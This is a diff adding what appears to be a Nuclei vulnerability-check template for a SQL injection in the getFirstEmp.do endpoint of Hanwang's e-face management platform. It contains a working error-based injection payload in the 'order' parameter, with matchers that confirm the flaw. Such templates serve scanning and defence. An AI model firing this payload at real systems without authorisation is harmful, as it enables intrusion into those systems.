@@ -1,0 +1,24 @@
+id: hanwangE-getFirstEmp_do-sql
+
+info:
+  name: 汉王e脸通综合管理平台 getFirstEmp.do SQL注入漏洞
+  author: hanwangE
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /manage/firstPeopleOpen/getFirstEmp.do?recoToken=67mds2pxXQb&page=1&pageSize=10&groupId=1&order=(UPDATEXML(2920,CONCAT(0x7e,MD5(123123),0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '4297f44b13955235245b2497399d7a9'
+          - 'XPATH syntax error:'
+        condition: and
+      - type: status
+        status: 
+          - 200
